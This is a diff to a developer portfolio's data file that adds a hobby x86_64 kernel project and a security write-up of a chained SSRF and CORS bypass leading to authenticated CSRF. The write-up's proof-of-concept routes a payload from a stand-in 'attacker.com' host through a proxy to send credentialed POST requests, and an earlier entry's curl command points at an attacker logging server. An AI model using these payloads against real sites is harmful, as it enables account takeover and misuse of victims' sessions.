@@ -179,6 +179,7 @@ const rawData = {
       items: [
         "Reverse Engineering",
         "DLL Injection & IAT Hooking",
+        "Attack Chaining",
         "Desktop Automation & Macro Runtimes",
         "DX / Developer Tooling",
         "Anti-Cheat Subsystem Design",
@@ -604,6 +605,15 @@ task deploy depends test {
     echo("deploying to production...")
 }`,
     },
+    {
+      title: "BadOS (Meat kernel)",
+      tags: ["C", "Assembly", "OSDev", "Kernel", "x86_64", "Limine"],
+      desc: "A 64-bit hobby operating system kernel featuring a custom executable format (KEX) and ring-3 userspace isolation.",
+      details:
+        "Started as 'Meat' (a skeletal kernel) and evolved into a graphical OS capable of video playback. Key engineering feats include writing a Physical and Virtual Memory Manager (PMM/VMM) from scratch, implementing a Preemptive Multitasking Scheduler, and handling x86_64 interrupt vectors (IDT/GDT). I also designed 'KEX', a custom executable format, and wrote a linker ('kex-ld') to convert ELFs for the OS. The stability of the kernel is demonstrated by a userspace program that renders the 'Bad Apple!!' music video at 30FPS via a custom framebuffer syscall interface.",
+      link: "https://github.com/dev-kas/meat",
+      hasCode: false,
+    },
   ],
   security: [
     {
@@ -657,6 +667,23 @@ task deploy depends test {
   -b '<REDACTED_COOKIE>' \\
   --data '{"url":"https://attacker-logging-server.com/beacon.png"}'`,
       lang: "bash",
+    },
+    {
+      title: "Chained SSRF & CORS Bypass Leading to Authenticated CSRF",
+      severity: "critical",
+      severityLabel: "9.8 (Critical)",
+      tags: ["SSRF", "CORS Bypass", "Attack Chaining", "CSRF", "Proxy Abuse"],
+      desc: "Identified a logic flaw where an internal proxy service allowed arbitrary URL fetching (SSRF). By chaining this with a lax CORS policy on the main application, I utilized the proxy to serve a malicious payload from the trusted domain's origin. This bypassed Same-Origin Policy (SOP) restrictions, allowing the payload to send authenticated POST requests with the victim's session cookies, effectively turning an SSRF into a zero-click Account Takeover/Action execution.",
+      poc: `// the payload URL that forces the browser to treat the exploit as Same-Origin
+const exploit = "https://proxy.target.com/?destination=https://attacker.com/csrf-payload.html";
+
+// inside csrf-payload.html (served via proxy):
+fetch("https://api.target.com/user/follow", {
+  method: "POST",
+  body: JSON.stringify({ userId: "attacker" }),
+  credentials: "include" // succeeds because origin matches proxy.target.com
+});`,
+      lang: "javascript",
     },
   ],
   contact: [
